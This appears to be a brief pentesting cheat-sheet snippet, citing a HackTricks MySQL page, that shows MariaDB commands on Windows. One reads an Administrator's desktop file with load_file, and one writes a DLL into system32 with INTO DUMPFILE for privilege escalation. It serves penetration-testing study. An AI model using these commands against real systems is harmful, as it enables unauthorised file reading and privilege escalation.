https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql

# For Windows
```sh
# Read a file
MariaDB [(none)]> select load_file('C:\\\\Users\\Administrator\\Desktop\\proof.txt');

# Dump contents of a file in another file
MariaDB [(none)]> select load_file('C:\\\\programdata\\privesc\\phoneinfo.dll') into dumpfile 'C:\\\\Windows\\system32\\phoneinfo.dll';
```